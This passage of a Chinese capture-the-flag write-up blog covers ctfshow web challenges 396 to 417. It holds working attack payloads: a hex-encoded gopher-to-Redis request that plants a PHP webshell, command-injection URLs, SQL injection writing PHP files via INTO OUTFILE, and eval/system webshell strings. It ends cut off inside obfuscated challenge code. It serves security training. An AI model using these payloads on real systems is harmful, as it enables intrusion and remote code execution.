0x676f706865723a2f2f3132372e302e302e313a363337392f5f2532413125304425304125323438253044253041666c757368616c6c2530442530412532413325304425304125323433253044253041736574253044253041253234312530442530413125304425304125323433302530442530412530412530412533432533467068702532302534306576616c2532382532345f504f5354253542312535442532392533422532302533462533452530412530412530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343325304425304164697225304425304125323431332530442530412f7661722f7777772f68746d6c2530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343130253044253041646266696c656e616d65253044253041253234392530442530417368656c6c2e706870253044253041253241312530442530412532343425304425304173617665253044253041253041); %23\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-其他","url":"/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/","content":"\nweb396 特定函数绕过\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 17:20:22# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; &#x27;.$url[&#x27;path&#x27;]);&#125;else&#123;    highlight_file(__FILE__);&#125;\n这里通过文档查看parse_url函数可知，host部分是跟在@后头的，而path部分是跟在第一个/后头的（从@开始算的）\n\n而第二个知识点就是系统命令可以通过反引号或者$()进行包括\n因此可以针对host部分和path部分进行构造\n?url=http://@$(ls)/var/www/html/1.txt?url=http://@$(cat fl0g.php)/var/www/html/1.txt\n\nweb397. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 17:49:13# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);&#125;else&#123;    highlight_file(__FILE__);&#125;\n有个前缀限制，可以通过../绕过\n?url=http://@$(cat fl0g.php)/../var/www/html/1.txt\n\nweb398. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:00:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(!preg_match(&#x27;/;/&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n禁了;，不过没影响\n\nweb399. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:04:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(!preg_match(&#x27;/;|&gt;/&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\nban了; &gt;，可以继续打\n\nweb400. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:13:14# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(!preg_match(&#x27;/;|&gt;|http|https/i&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\nban了http和https协议，经测试，只要以//开头仍然可以解析出后面的各键值。那么既然schema字段也没用，直接去掉即可\n\n?url=//@$(cat fl0g.php)/../var/www/html/1.txt\n\nweb401. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:16:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/#error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    var_dump($url);    if(!preg_match(&#x27;/;|&gt;|http|https|\\|/i&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n多ban了一个| 不影响\n\nweb402. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:35:41# @email: h1xa@ctfer.com# @link: https://ctfer.com*/#error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    var_dump($url);    if(preg_match(&#x27;/http|https/i&#x27;, $url[&#x27;scheme&#x27;]))&#123;        die(&#x27;error&#x27;);    &#125;    if(!preg_match(&#x27;/;|&gt;|\\||base/i&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n对host部分ban了; &gt; | base，不影响\n\nweb403. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 18:44:06# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(preg_match(&#x27;/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/&#x27;, $url[&#x27;host&#x27;]))&#123;        shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n可以看到命令执行语句换成了curl\n这里复习一下管道符的作用\n| 直接执行后面的语句|| 如果前面执行的语句出错，则执行后面的语句&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句; 执行完前面的再执行后面的\n因此只需要构造出符合条件的host，后面拼接另一条命令即可，管道符连接\nhttp://192.168.13.13/xxx;ls&gt;/var/www/html/1.txthttp://192.168.13.13/xxx;cat fl0g.php&gt;/var/www/html/1.txt\n\nweb404 特定函数绕过\n\nweb405 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 19:20:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = parse_url($_GET[&#x27;url&#x27;]);    if(preg_match(&#x27;/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./&#x27;, $url[&#x27;host&#x27;]))&#123;        if(preg_match(&#x27;/^\\/[A-Za-z0-9]+$/&#x27;, $url[&#x27;path&#x27;]))&#123;            if(preg_match(&#x27;/\\~|\\.|php/&#x27;, $url[&#x27;scheme&#x27;]))&#123;                shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);            &#125;                    &#125;    &#125;&#125;else&#123;    highlight_file(__FILE__);    echo &#x27;parse_url 好强大&#x27;;&#125;parse_url 好强大\n首先这里schema必须包含php|.|~，经过测试发现httphp也是可以被识别到；\n\npath部分严格限制了只能为/字母|数字；host部分正则在结尾多了个.可以利用\npayload\n?url=httphp://127.0.0.111;echo `cat fl*`&gt;1.txt;1/a\n\nweb406 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-16 14:58:50# @Last Modified by:   h1xa# @Last Modified time: 2021-01-16 16:00:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/require &#x27;config.php&#x27;;//flag in dbhighlight_file(__FILE__);$url=$_GET[&#x27;url&#x27;];if(filter_var ($url,FILTER_VALIDATE_URL))&#123;    $sql = &quot;select * from links where url =&#x27;&#123;$url&#125;&#x27;&quot;;    $result = $conn-&gt;query($sql);&#125;else&#123;    echo &#x27;不通过&#x27;;&#125;Notice: Undefined index: url in /var/www/html/index.php on line 17不通过\n针对filter_var()函数\n使用特定的过滤器过滤一个变量参数：FILTER_VALIDATE_URLoptionally with required components. Beware a valid URL may not specify the HTTP protocol http:// so further validation may be required to determine the URL uses an expected protocol, e.g. ssh:// or mailto:. Note that the function will only find ASCII URLs to be valid; internationalized domain names (containing non-ASCII characters) will fail.\n注意空格也不能通过解析，因此可以通过/**/绕过。可通过url检测的格式如下\njavascript://www.baidu.com;&lt;payload&gt;;\n提示了flag in db，我们想要回显的话可以将其写入到文件中，先判断字段数\njavascript://www.baidu.com;&#x27;union/**/select/**/1,2/**/into/**/outfile/**/&quot;/var/www/html/9.txt&quot;%23;\n字段数为2\n\n\n\n接下来就是查表，由于是写入文件，所以这里利用的比较巧妙，我可以先写入一段恶意代码，在其中执行恶意sql语句来绕过直接的url检测，恶意代码只需用编码绕过即可，妙！\n\n**恶意代码如下**\n\n&lt;?php require &#x27;config.php&#x27;;$sql=&#x27;select 1, group_concat(table_name) from information_schema.tables where table_schema=database() into outfile &quot;/var/www/html/9.txt&quot;&#x27;;$result=$conn-&gt;query($sql);?&gt;\n\n将其编码后放入payload\n\njavascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d6461746162617365282920696e746f206f757466696c6520222f7661722f7777772f68746d6c2f382e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/8.php&quot;%23;\n\n麻了这里有很多限制，写过一次好像不能覆盖写\n\n![image-20221119005236988](ctfshow-其他/image-20221119005236988.png)\n\n查字段\n\n&lt;?php require &#x27;config.php&#x27;;$sql=&#x27;select 1, group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot; into outfile &quot;/var/www/html/7.txt&quot;&#x27;;$result=$conn-&gt;query($sql);var_dump($result);?&gt;\n\njavascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d22666c61672220696e746f206f757466696c6520222f7661722f7777772f68746d6c2f372e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/7.php&quot;%23;\n\n![image-20221119005536171](ctfshow-其他/image-20221119005536171.png)\n\n查flag\n\n&lt;?php require &#x27;config.php&#x27;;$sql=&#x27;select 1, group_concat(flag) from flag into outfile &quot;/var/www/html/6.txt&quot;&#x27;;$result=$conn-&gt;query($sql);var_dump($result);?&gt;\n\njavascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e63617428666c6167292066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f362e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/6.php&quot;%23;\n\nweb407 特定函数绕过，来一杯咖啡？\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-16 14:58:50# @Last Modified by:   h1xa# @Last Modified time: 2021-01-16 17:24:13# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$ip=$_GET[&#x27;ip&#x27;];if(filter_var ($ip,FILTER_VALIDATE_IP))&#123;    call_user_func($ip);&#125;class cafe&#123;    public static function add()&#123;        echo file_get_contents(&#x27;flag.php&#x27;);    &#125;&#125;\n回顾一下call_user_func()\ncall_user_func — 把第一个参数作为回调函数调用\n这里存在一个cafe类，并且内含静态方法add可以读出flag\n针对FILTER_VALIDATE_IP\nFails validation for the following reserved IPv4 ranges: 0.0.0.0/8, 169.254.0.0/16, 127.0.0.0/8 and 240.0.0.0/4.Fails validation for the following reserved IPv6 ranges: ::1/128, ::/128, ::ffff:0:0/96 and fe80::/10.\n我们可以尝试IPV6地址\ncafe::add\n\nweb408 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-16 14:58:50# @Last Modified by:   h1xa# @Last Modified time: 2021-01-16 19:53:18# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$email=$_GET[&#x27;email&#x27;];if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;    file_put_contents(explode(&#x27;@&#x27;, $email)[1], explode(&#x27;@&#x27;, $email)[0]);&#125;\n这次是针对FILTER_VALIDATE_EMAIL，如果通过校验，会将@后面的部分当做文件名，前面部分当做内容，执行文件写操作\nAllows the local part of the email address to contain Unicode characters.\n首先针对文件名，可以直接改为任意文件后缀\n\n\n\n然后对于前面，如果包含特殊字符，双引号包含下是可以绕过的\n\n&quot;&lt;?=system($_POST[1])?&gt;&quot;@qq.php\n\nweb409. 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-16 14:58:50# @Last Modified by:   h1xa# @Last Modified time: 2021-01-16 20:26:16# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$email=$_GET[&#x27;email&#x27;];if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;    $email=preg_replace(&#x27;/.flag/&#x27;, &#x27;&#x27;, $email);    eval($email);&#125;\n这里会把flag和之前的字符都给过滤掉，我们怎么利用呢？我们想的是通过?&gt;闭合php标签来绕过后面的检测，但是由于前面还存在双引号所以仍然会报错\n\n\n\n因此 我们想要把前面的”在通过filter检验后过滤掉，就需要用到这个正则替换函数\n&quot;flagsystem($_GET[1])?&gt;&quot;@1.php?email=&quot;flagsystem($_GET[1])?&gt;&quot;@1.php&amp;1=cat%20/flag\n\nweb410 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 13:12:41# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#x27;flag.php&#x27;);$b=$_GET[&#x27;b&#x27;];if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;    if($b==&#x27;true&#x27; || intval($b)&gt;0)&#123;        die(&#x27;FLAG NOT HERE&#x27;);    &#125;else&#123;        echo $flag;    &#125;&#125;\n过滤器又换了，针对FILTER_VALIDATE_BOOLEAN\nReturns true for &quot;1&quot;, &quot;true&quot;, &quot;on&quot; and &quot;yes&quot;. Returns false otherwise.If FILTER_NULL_ON_FAILURE is set, false is returned only for &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot;, and &quot;&quot;, and null is returned for all non-boolean values.\n简单题直接yes\n\nweb411 特定函数绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 13:12:41# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#x27;flag.php&#x27;);$b=$_GET[&#x27;b&#x27;];if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;    if($b==&#x27;true&#x27; || intval($b)&gt;0 ||$b==&#x27;on&#x27; || $b==&#x27;ON&#x27;)&#123;        die(&#x27;FLAG NOT HERE&#x27;);    &#125;else&#123;        echo $flag;    &#125;&#125;\n一样的yes\n\nweb412 语法绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 16:19:28# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_POST[&#x27;ctfshow&#x27;];if(isset($ctfshow))&#123;    file_put_contents(&#x27;flag.php&#x27;, &#x27;//&#x27;.$ctfshow,FILE_APPEND);    include(&#x27;flag.php&#x27;);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16\n这里会追加//xxx内容到flag.php中，并且最后包含进来\n这里仍然用到php闭合标签来使得//不会影响后面代码的执行\nctfshow=?&gt;&lt;?php eval($_POST[1]); ?&gt;&amp;1=system(&#x27;tac flag.php&#x27;);\n\nweb413 语法绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 16:19:28# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_POST[&#x27;ctfshow&#x27;];if(isset($ctfshow))&#123;        file_put_contents(&#x27;flag.php&#x27;, &#x27;/*&#x27;.$ctfshow.&#x27;*/&#x27;,FILE_APPEND);    include(&#x27;flag.php&#x27;);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16\n这里需要将注释符闭合\nctfshow=*/@eval($_POST[1]);?&gt;/*&amp;1=system(&#x27;tac flag.php&#x27;);\n\nweb414 语法绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 16:43:53# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);$ctfshow=$_GET[&#x27;ctfshow&#x27;];if($ctfshow==true)&#123;    if(sqrt($ctfshow)&gt;=sqrt(intval($flag)))&#123;        echo &#x27;FLAG_NOT_HERE&#x27;;    &#125;else&#123;        echo $flag;    &#125;&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16\n首先第一个if判断存在弱类型比较，而第二个判断由于flag非数字，并且以字母开头，所以直接就是0，输入任何一个正数会进入if，所以应该输入一个负数\nsqrt()返回 num 的平方根，负数时返回 NAN\nctfshow=-1\n\nweb415 语法绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 19:15:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);$k = $_GET[k];function getflag()&#123;    echo file_get_contents(&#x27;flag.php&#x27;);&#125;if($k==&#x27;getflag&#x27;)&#123;    die(&#x27;FLAG_NOT_HERE&#x27;);&#125;else&#123;    call_user_func($k);&#125;\n我这里加了一个命名空间\\getflag来绕过\n实际上，函数名、方法名、类名是不区分大小写的，因此大小写也是可以绕过的\n\\getflagGEtflag\n\nweb416 语法绕过\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 19:54:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctf&#123;    public function getflag()&#123;        return &#x27;fake flag&#x27;;    &#125;    final public function flag()&#123;        echo file_get_contents(&#x27;flag.php&#x27;);    &#125;&#125;class show extends ctf&#123;    public function __construct($f)&#123;        call_user_func($f);    &#125;&#125;echo new show($_GET[f]);\nshow类实例化时触发构造函数，其中会调用call_user_func，我们看到show类是继承于ctf类的，根据官方文档\n\nparent::flag\n\nweb417 想想办法\n题目给了源码\n&lt;?php /*ctfshow*/ define(&#x27;aPeKTP0126&#x27;, __FILE__);$cIYMfW = urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$CBhSfw = $cIYMfW[3] . $cIYMfW[6] . $cIYMfW[33] . $cIYMfW[30];$xWoIVy = $cIYMfW[33] . $cIYMfW[10] . $cIYMfW[24] . $cIYMfW[10] . $cIYMfW[24];$RkEEuV = $xWoIVy[0] . $cIYMfW[18] . $cIYMfW[3] . $xWoIVy[0] . $xWoIVy[1] . $cIYMfW[24];$YFfKrW = $cIYMfW[7] . $cIYMfW[13];$CBhSfw .= $cIYMfW[22] . $cIYMfW[36] . $cIYMfW[29] . $cIYMfW[26] . $cIYMfW[30] . $cIYMfW[32] . $cIYMfW[35] . $cIYMfW[26] . $cIYMfW[30];eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aG